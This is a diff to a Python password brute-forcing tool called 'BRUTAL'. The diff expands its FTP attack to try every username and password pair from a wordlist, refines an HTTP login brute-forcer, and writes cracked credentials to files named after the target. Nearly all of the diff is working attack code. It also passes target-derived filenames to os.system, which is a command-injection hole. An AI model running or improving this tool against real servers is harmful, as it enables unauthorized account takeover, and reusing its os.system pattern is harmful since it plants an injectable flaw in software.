@@ -41,30 +41,36 @@ def ftpBruteForce(IP, wordlist):
             print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
 
     # Starting brute-force attack
+    dictionary = []
     f = open(wordlist, 'r')
-    for word in f.readlines():
-        word = word.strip('\n')
-        try:
-            ftp = ftplib.FTP(IP, timeout=1)
-            ftp.login(word,word)
-            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}\n")
-            credentials.append(word+":"+word)
-            ftp.quit()
-        except Exception as e:
-            print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
-    f.close()
+    dictionary = f.readlines()
+
+    for user in dictionary:
+        user = user.strip('\n')
+        for passwd in dictionary:
+            passwd = passwd.strip('\n')
+            try:
+                ftp = ftplib.FTP(IP, timeout=0.1)
+                ftp.login(user,passwd)
+                print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {user}:{passwd}\n")
+                credentials.append(user+":"+passwd)
+                ftp.quit()
+            except Exception as e:
+                print(f"[{colors.RED}-{colors.RESET}] Login failed using {user}:{passwd}")
 
     # Checking whether we got some credentials or not
     if(len(credentials) != 0):
-        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!")
+        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!\n")
         filename = f"{IP}-FTP-cracked.txt"
         os.system(f'touch {filename}')
         f = open(filename, 'w')
         for creds in credentials:
             f.write(creds+"\n")
         f.close()
+        print(f"[{colors.GREEN}+{colors.RESET}] Saving results in '{colors.YELLOW}{filename}{colors.RESET}'...\n")
+        time.sleep(1)
     else:
-        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!")
+        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!\n")
 
 # Function to implement brute-force attack on the web server
 def httpBruteForce(url, username, wordlist):
@@ -85,18 +91,26 @@ def httpBruteForce(url, username, wordlist):
         # Checking the HTTP response
         if 'Welcome' in r.text:
             print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {username}:{word}\n")
-
+            
             # Saving the cracked credentials in a file
-            filename = f"{url}-HTTP-cracked.txt"
+            filename = f"{url.split('/')[2]}-HTTP-cracked.txt"
             os.system(f'touch {filename}')
             f = open(filename, 'w')
-            f.write(f"{username}:{word}")
+            f.write(f"{username}:{word}\n")
             f.close()
+            print(f"[{colors.GREEN}+{colors.RESET}] Saving results in '{colors.YELLOW}{filename}{colors.RESET}'...\n")
+            time.sleep(1)
             break
         else:
             print(f"[{colors.RED}-{colors.RESET}] Login failed using {username}:{word}")
 
+def banner():
+    print(f"="*50)
+    print("\n"+" "*10+f"{colors.YELLOW}BRUTAL: A brute forcing tool{colors.RESET}\n")
+    print(f"="*50+"\n")
+
 def main():
+    banner()
     usage = f"{colors.YELLOW}Usage: python3 brutal.py <wordlist> <ftp or ssh or http>{colors.RESET}"
 
     # Checking the existence of the wordlist file
